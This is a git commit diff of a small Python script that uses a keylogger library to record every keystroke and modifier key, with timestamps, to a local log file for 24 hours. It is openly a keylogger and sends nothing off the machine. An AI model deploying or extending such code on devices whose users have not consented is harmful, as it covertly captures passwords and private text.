6b4cc9522cff49a372f8c0dd3e9723bc4982ed75
yagami light <halysl0817@gmail.com>
2018-09-22 19:29:20 +0800

    finish recode

--- recording.py
+++ recording.py
@@ -2,19 +2,48 @@
 
 import keylogger
 import time
+import logging
+import os
 
-now = time.time()
-time = lambda: time.time() > now + 60 * 60 *24
 
-def print_keys(t, modifiers, keys): 
+curr_path = os.path.dirname(os.path.abspath(__file__))
+
+
+def get_logger():
+    fmt = "%(asctime)-15s %(levelname)s %(filename)s %(lineno)d %(process)d %(message)s"
+    datefmt = "%a %d %b %Y %H:%M:%S"
+    formatter = logging.Formatter(fmt, datefmt)
+
+    filename = 'catch_key.log'
+    filepath = os.path.join(curr_path, filename)
+    fh = logging.FileHandler(filepath, mode='a', encoding=None, delay=False)
+    fh.setLevel(logging.INFO)
+    fh.setFormatter(formatter)
+
+    logger_name = 'Catch-Key'
+    logger = logging.getLogger(logger_name)
+    logger.setLevel(logging.INFO)
+    logger.addHandler(fh)
+    
+    return logger
+
+
+logger = get_logger()
+
+
+def recoding_keys(t, modifiers, keys):
     if keys:
-        print("{}  {}".format(t, keys))
+        date = "{}  {}".format(t, keys)
+        logger.info(date)
     else:
         for key, value in modifiers.items():
             if value:
-                print("{}  {}".format(t, key))
+                date = "{}  {}".format(t, key)
+                logger.info(date)
+                break
 
-def recoding_keys(t, modifiers, keys):
-    pass
 
-keylogger.log(time, print_keys)
+if __name__ == "__main__":
+    now = time.time()
+    when_stop = lambda: time.time() > now + 60 * 60 * 24
+    keylogger.log(when_stop, recoding_keys)
